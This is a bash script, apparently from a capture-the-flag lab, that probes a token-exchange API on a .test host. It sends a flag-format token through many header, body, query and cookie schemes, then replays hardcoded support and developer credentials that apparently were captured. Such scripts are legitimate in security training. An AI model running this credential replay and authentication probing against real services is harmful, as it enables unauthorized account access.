set +e
B=https://cloud-api.keplerops.test
P=$B/api/workspaces/current/token-exchange
WT='FLAG{6bb66074f2325405}'
p(){ echo "=== $1"; shift; curl -sSk -m 8 -w '\n[HTTP %{http_code}]\n' "$@" | head -20; }
p "json workspace_token" -X POST -H 'Content-Type: application/json' -d "{\"workspace_token\":\"$WT\"}" "$P"
p "json token" -X POST -H 'Content-Type: application/json' -d "{\"token\":\"$WT\"}" "$P"
p "form workspace_token" -X POST -d "workspace_token=$WT" "$P"
p "form token" -X POST -d "token=$WT" "$P"
p "query workspace_token" "$P?workspace_token=$WT"
p "query token" "$P?token=$WT"
p "auth Workspace scheme" -H "Authorization: Workspace $WT" "$P"
p "auth Token scheme" -H "Authorization: Token $WT" "$P"
p "auth Basic workspace:WT" -u "workspace:$WT" "$P"
p "auth Basic WT:" -u "$WT:" "$P"
p "header X-Auth-Token" -H "X-Auth-Token: $WT" "$P"
p "header X-API-Key" -H "X-API-Key: $WT" "$P"
p "header X-Fieldkest-Workspace" -H "X-Fieldkest-Workspace: $WT" "$P"
p "header X-Workspace" -H "X-Workspace: $WT" "$P"
p "cookie workspace_token" -H "Cookie: workspace_token=$WT" "$P"
p "post bearer workspace_token" -X POST -H "Authorization: Bearer $WT" -H 'Content-Type: application/json' -d '{}' "$P"
echo "== token-exchange with workspace_token body =="
p "json ws token" -X POST -H 'Content-Type: application/json' -d "{\"workspace_token\":\"$WT\"}" "$B/api/token-exchange/workspace"
p "json workload_token WT" -X POST -H 'Content-Type: application/json' -d "{\"workload_token\":\"$WT\"}" "$B/api/token-exchange/workspace"
echo "== s3 creds / support token against workspace exchange =="
p "support bearer" -H 'Authorization: Bearer fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b' "$P"
p "dev basic" -u 'rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo' "$P"
